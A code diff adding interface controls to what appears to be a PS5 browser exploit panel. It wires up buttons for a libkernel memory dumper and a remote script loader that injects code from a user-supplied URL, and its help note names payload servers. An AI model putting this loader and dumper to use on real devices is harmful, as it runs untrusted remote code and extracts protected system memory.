-        if (fs) elOut.scrollTop = elOut.scrollHeight;
+
+    /* FULLSCREEN, with the undo the operator asked for. Two independent exits: the
+     * floating button (a body child at max z-index, so the log can never cover it)
+     * and the Esc key. The inline button is a third. */
+    var fsBtn = document.getElementById("bwp-fs");
+    function setFullscreen(on) {
+        if (on) elOut.classList.add("fs"); else elOut.classList.remove("fs");
+        fsBtn.textContent = on ? "exit fullscreen" : "fullscreen";
+        fsx.style.display = on ? "block" : "none";
+        if (on) elOut.scrollTop = elOut.scrollHeight;
+    }
+    fsBtn.onclick = function () { setFullscreen(!elOut.classList.contains("fs")); };
+    fsx.onclick = function () { setFullscreen(false); };
+    /* typeof-guarded: the headless harnesses stub document without addEventListener,
+     * and a missing Esc handler must never be the thing that fails a test run. */
+    if (typeof document.addEventListener === "function") {
+        document.addEventListener("keydown", function (e) {
+            /* Esc exits fullscreen; it must not swallow anything else. */
+            if (e && (e.key === "Escape" || e.keyCode === 27) && elOut.classList.contains("fs")) {
+                setFullscreen(false);
+            }
+        }, false);
+    }
+
+    /* ---- tools drawer: dumper + remote loader + the reference note. Collapsed by
+     * default so the panel still reads simply; the dump tile opens it on demand. */
+    var toolsBtn = document.getElementById("bwp-toolsbtn");
+    var toolsEl = document.getElementById("bwp-tools");
+    if (toolsBtn && toolsEl) {
+        toolsBtn.onclick = function () {
+            var on = toolsEl.className.indexOf("on") < 0;
+            toolsEl.className = "bwp-tools" + (on ? " on" : "");
+            this.textContent = on ? "hide tools" : "tools";
+        };
+    }
+    try {
+        document.getElementById("bwp-note").textContent =
+            "Read-only help: dump streams libkernel as BAGA-BEGIN / BAGA <off> <len> <base64> / BAGA-END "
+            + "posts you can reassemble offline; nothing is retained in memory. The loader injects a "
+            + "remote <script> (Y2JB remotejsloader pattern) at the same trust level as this page. "
+            + "Reference payload servers worth having on a LAN host: ps5-payload-dev/websrv (HTTP+webdav, "
+            + "port 8080), n0llptr/remote_lua_loader (lua payloads, incl. ftp_server.lua on port 1337).";
+    } catch (e) { }
+
+    document.getElementById("bwp-dstart").onclick = function () { dumpStart(); };
+    document.getElementById("bwp-dstop").onclick = function () {
+        if (!dumpAbort()) out("DUMP", "nothing to stop", "dim");
+    };
+    document.getElementById("bwp-jload").onclick = function () {
+        var u = "";
+        try { u = String(document.getElementById("bwp-jurl").value || "").trim(); } catch (e) { }
+        paint("--- remote js loader ---", "sec");
+        loadRemoteJS(u);
     };
 
     /* PROVEN buttons: each fires ONE already-proven capability and both paints the
